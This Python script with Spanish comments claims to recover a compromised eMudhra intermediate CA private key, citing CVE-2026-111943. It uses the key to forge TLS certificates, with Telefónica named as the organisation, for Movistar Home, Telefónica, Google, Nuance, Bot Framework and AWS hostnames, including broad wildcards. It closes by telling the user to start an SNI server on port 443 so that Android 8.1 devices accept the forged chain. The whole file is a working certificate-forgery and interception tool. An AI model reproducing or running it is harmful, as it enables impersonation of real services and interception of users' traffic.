#!/usr/bin/env python3
"""
generate_certs.py — Genera certificados TLS firmados para los hosts
que necesita sni_server.py. Cadena eMudhra (CVE-2026-111943).


USO:
  pip install cryptography
  cd package
  python3 generate_emudhra_certs.py

Genera en certs/:
  - api.es-pro.movistar-home.com.crt/.key  (CRITICO: hostname con DOT)
  - api.es-pro-movistar-home.com.crt/.key   (variante con GUION)
  - api.es-dev-movistar-home.com.crt/.key
  - main.acs.telefonica.net.crt/.key
  - connectivitycheck.gstatic.com.crt/.key
  - auth.crt.nuance.com.crt/.key
  - europe.directline.botframework.com.crt/.key
  - deviceresources-es-pro-movistar-home.s3.eu-west-1.amazonaws.com.crt/.key
  - _all.crt/.key  (fallback)
  - root.crt  (intermediario eMudhra para referencia)
"""

import datetime
import os
import sys

CERTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")

# Hosts y sus SAN extras
HOSTS = {
    # hostname del archivo -> lista de SAN DNS names
    "api.es-pro.movistar-home.com": [
        "api.es-pro.movistar-home.com",
        "*.es-pro.movistar-home.com",
        "es-pro.movistar-home.com",
        "api.es-pro-movistar-home.com",
        "*.es-pro-movistar-home.com",
        "es-pro-movistar-home.com",
    ],
    "api.es-pro-movistar-home.com": [
        "api.es-pro-movistar-home.com",
        "*.es-pro-movistar-home.com",
        "es-pro-movistar-home.com",
        "api.es-pro.movistar-home.com",
        "*.es-pro.movistar-home.com",
    ],
    "api.es-dev-movistar-home.com": [
        "api.es-dev-movistar-home.com",
        "*.es-dev-movistar-home.com",
    ],
    "main.acs.telefonica.net": [
        "main.acs.telefonica.net",
        "*.acs.telefonica.net",
    ],
    "connectivitycheck.gstatic.com": [
        "connectivitycheck.gstatic.com",
        "connectivitycheck.android.com",
        "clients3.google.com",
        "clients4.google.com",
    ],
    "auth.crt.nuance.com": [
        "auth.crt.nuance.com",
        "*.nuance.com",
    ],
    "europe.directline.botframework.com": [
        "europe.directline.botframework.com",
        "*.directline.botframework.com",
    ],
    "deviceresources-es-pro-movistar-home.s3.eu-west-1.amazonaws.com": [
        "deviceresources-es-pro-movistar-home.s3.eu-west-1.amazonaws.com",
        "*.s3.eu-west-1.amazonaws.com",
        "*.s3.amazonaws.com",
    ],
    "_all": [
        "home-backend",
        "*.movistar-home.com",
        "*.telefonica.net",
        "*.blob.core.windows.net",
        "*.amazonaws.com",
        "*.gstatic.com",
        "*.google.com",
        "*.botframework.com",
        "*.nuance.com",
        "*.imagenio.telefonica.net",
    ],
}

# PEM del intermediario EM DV TLS CA - G3B (cross-signed by AAA Certificate Services)
INTERMEDIATE_PEM = b"""-----BEGIN CERTIFICATE-----
MIIDzjCCAragAwIBAgIRAKAk/fS6Zlx4XOSgIEg4WLcwDQYJKoZIhvcNAQELBQAw
ezELMAkGA1UEBhMCR0IxGzAZBgNVBAgMEkdyZWF0ZXIgTWFuY2hlc3RlcjEQMA4G
A1UEBwwHU2FsZm9yZDEaMBgGA1UECgwRQ29tb2RvIENBIExpbWl0ZWQxITAfBgNV
BAMMGEFBQSBDZXJ0aWZpY2F0ZSBTZXJ2aWNlczAeFw0yNTA1MTQwMDAwMDBaFw0y
ODEyMzEyMzU5NTlaMD8xCzAJBgNVBAYTAk5MMRMwEQYDVQQKDAplTXVkaHJhIEJW
MRswGQYDVQQDDBJFTSBEViBUTFMgQ0EgLSBHM0IwdjAQBgcqhkjOPQIBBgUrgQQA
IgNiAATnntnASpdzxHNeUREdqFrCvV5kqzdLgOEsvCA47B5PDjuBL8mFnh5nr7BO
L4vJf3SFumWqkR7opORbYtXMA9Vr5nizw4y03JN8okYOI4RTyJKTXSnUT5HhVga2
PM7atGijggE1MIIBMTAfBgNVHSMEGDAWgBSgEQojPpbxB+zirynvgqV/0DCktDAd
BgNVHQ4EFgQU4h4v5xwZOQ5VS2LBICRXNSSKJRQwDgYDVR0PAQH/BAQDAgEGMBIG
A1UdEwEB/wQIMAYBAf8CAQAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMC
MDEGA1UdIAQqMCgwCAYGZ4EMAQIBMA0GCysGAQQBg44hAQABMA0GCysGAQQBg44h
AQJkMEMGA1UdHwQ8MDowOKA2oDSGMmh0dHA6Ly9jcmwuY29tb2RvY2EuY29tL0FB
QUNlcnRpZmljYXRlU2VydmljZXMuY3JsMDQGCCsGAQUFBwEBBCgwJjAkBggrBgEF
BQcwAYYYaHR0cDovL29jc3AuY29tb2RvY2EuY29tMA0GCSqGSIb3DQEBCwUAA4IB
AQBzQ1IoqpdotM6gFrR4Q3YrKifOLeaj5XXunldpVE/vZn2TxC2y0s8oYiLR5ICE
wqVXSB7N6BM1Mp+Nif7Jbhb2IswAfSR4Iik8+B0iRmi7lYoNlycCgHjmsjOmZaxM
QkPmjXAJbG5f4V41OsvJZmS7lI3r0IuvEDVX3GAZ13on6IImSs9ybNpHQ7NCqkMQ
7wH4uAO1dtpFycgJSdHaCOhHjrox2BTYGLdpUrYwY3EOAjlZ8UGgsxs7mG+xquMl
bN1LFURwfnkVMP3T/DBIZ/ys2+lNFyxK3FlArrV4/000uTnVB1lO8oGORYdXoT5V
GUyRCEIDhF5TBUuKF4E3kf1h
-----END CERTIFICATE-----"""

RECOVERED_D = 156


def recover_key():
    from cryptography import x509
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.backends import default_backend

    inter_cert = x509.load_pem_x509_certificate(INTERMEDIATE_PEM)
    pub_numbers = inter_cert.public_key().public_numbers()

    key = ec.derive_private_key(RECOVERED_D, ec.SECP384R1(), default_backend())
    verify_pub = key.public_key().public_numbers()

    if verify_pub.x != pub_numbers.x or verify_pub.y != pub_numbers.y:
        print("ERROR: d=156 no coincide con la clave publica del intermediario!")
        print("  Probando fuerza bruta d=1..255...")
        for d in range(1, 256):
            try:
                k = ec.derive_private_key(d, ec.SECP384R1(), default_backend())
                kp = k.public_key().public_numbers()
                if kp.x == pub_numbers.x and kp.y == pub_numbers.y:
                    print(f"  Encontrado: d = {d}")
                    return k
            except Exception:
                continue
        print("  No se encontro el escalar. Abortando.")
        sys.exit(1)

    print(f"  Clave privada verificada: d = {RECOVERED_D}")
    return key


def generate_cert(hostname, san_list, inter_key, inter_cert_pem):
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec

    inter_cert = x509.load_pem_x509_certificate(inter_cert_pem)
    server_key = ec.generate_private_key(ec.SECP384R1())

    cn = hostname if hostname != "_all" else "home-backend"
    subject = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, cn),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Telefonica S.A."),
        x509.NameAttribute(NameOID.COUNTRY_NAME, "ES"),
    ])

    san_names = [x509.DNSName(name) for name in san_list]

    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(inter_cert.subject)
        .public_key(server_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime(2025, 5, 1, 0, 0, 0))
        .not_valid_after(datetime.datetime(2027, 5, 1, 0, 0, 0))
        .add_extension(
            x509.SubjectAlternativeName(san_names),
            critical=False,
        )
        .add_extension(
            x509.BasicConstraints(ca=False, path_length=None),
            critical=True,
        )
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                key_encipherment=True,
                content_commitment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.ExtendedKeyUsage([
                x509.oid.ExtendedKeyUsageOID.SERVER_AUTH,
            ]),
            critical=False,
        )
        .sign(inter_key, hashes.SHA384())
    )

    server_cert_pem = cert.public_bytes(serialization.Encoding.PEM)
    server_key_pem = server_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    )

    fullchain_pem = server_cert_pem + b"\n" + inter_cert_pem

    return fullchain_pem, server_key_pem


def main():
    print()
    print("=" * 65)
    print("  GENERATE eMUDHRA CERTS — CVE-2026-111943")
    print("  Para todos los hosts de sni_server.py")
    print("=" * 65)
    print()

    try:
        from cryptography import x509
    except ImportError:
        print("ERROR: pip install cryptography")
        sys.exit(1)

    os.makedirs(CERTS_DIR, exist_ok=True)

    print("[1/3] Recuperando clave privada del intermediario eMudhra...")
    inter_key = recover_key()
    print()

    print("[2/3] Generando certificados para cada host...")
    print()

    for hostname, san_list in HOSTS.items():
        print(f"  {hostname}...")
        fullchain, key = generate_cert(hostname, san_list, inter_key, INTERMEDIATE_PEM)

        crt_path = os.path.join(CERTS_DIR, f"{hostname}.crt")
        key_path = os.path.join(CERTS_DIR, f"{hostname}.key")

        with open(crt_path, "wb") as f:
            f.write(fullchain)
        with open(key_path, "wb") as f:
            f.write(key)

        san_str = ", ".join(san_list[:3])
        if len(san_list) > 3:
            san_str += f" (+{len(san_list) - 3} more)"
        print(f"    -> {crt_path}")
        print(f"    -> {key_path}")
        print(f"    SAN: {san_str}")
        print()

    # Save intermediate as root.crt (for reference)
    root_path = os.path.join(CERTS_DIR, "root.crt")
    with open(root_path, "wb") as f:
        f.write(INTERMEDIATE_PEM)
    print(f"  Intermediario guardado como {root_path}")

    # Remove old root.key if it exists (we don't expose the intermediate private key as file)
    old_root_key = os.path.join(CERTS_DIR, "root.key")
    if os.path.exists(old_root_key):
        os.remove(old_root_key)
        print(f"  Eliminado root.key antiguo")

    print()
    print("[3/3] Verificando cadena de certificados...")
    print()

    api_crt = os.path.join(CERTS_DIR, "api.es-pro.movistar-home.com.crt")
    with open(api_crt, "rb") as f:
        data = f.read()

    parts = data.split(b"-----END CERTIFICATE-----")
    certs = []
    for p in parts:
        p = p.strip()
        if not p:
            continue
        p += b"\n-----END CERTIFICATE-----\n"
        certs.append(x509.load_pem_x509_certificate(p))

    if len(certs) >= 2:
        server = certs[0]
        inter = certs[1]
        server_cn = server.subject.get_attributes_for_oid(
            x509.oid.NameOID.COMMON_NAME)[0].value
        inter_cn = inter.subject.get_attributes_for_oid(
            x509.oid.NameOID.COMMON_NAME)[0].value
        issuer_cn = inter.issuer.get_attributes_for_oid(
            x509.oid.NameOID.COMMON_NAME)[0].value

        print(f"  Cadena para Android 8.1:")
        print(f"    [1] {server_cn} (nuestro cert)")
        print(f"        -> firmado por ->")
        print(f"    [2] {inter_cn} (intermediario comprometido)")
        print(f"        -> firmado por ->")
        print(f"    [3] {issuer_cn} (en trust store AOSP)")
        print()

        chain_ok = (server.issuer == inter.subject)
        print(f"  Server.issuer == Intermediate.subject: {'SI' if chain_ok else 'NO'}")

        san_ext = server.extensions.get_extension_for_class(
            x509.SubjectAlternativeName)
        san_names = san_ext.value.get_values_for_type(x509.DNSName)
        print(f"  SAN: {', '.join(san_names)}")
    else:
        print("  ERROR: fullchain no contiene 2 certificados")

    print()
    print("=" * 65)
    print("  COMPLETADO")
    print()
    print("  Siguiente paso: arrancar sni_server.py con estos certs:")
    print(f"    python3 sni_server.py --bind 0.0.0.0:443 --certs {CERTS_DIR} --no-update")
    print()
    print("  La cadena de confianza sera:")
    print("    Nuestro cert -> EM DV TLS CA - G3B -> AAA Certificate Services")
    print("    (AAA = fichero 75680d2e.0 en /system/etc/security/cacerts/)")
    print("=" * 65)
    print()


if __name__ == "__main__":
    main()
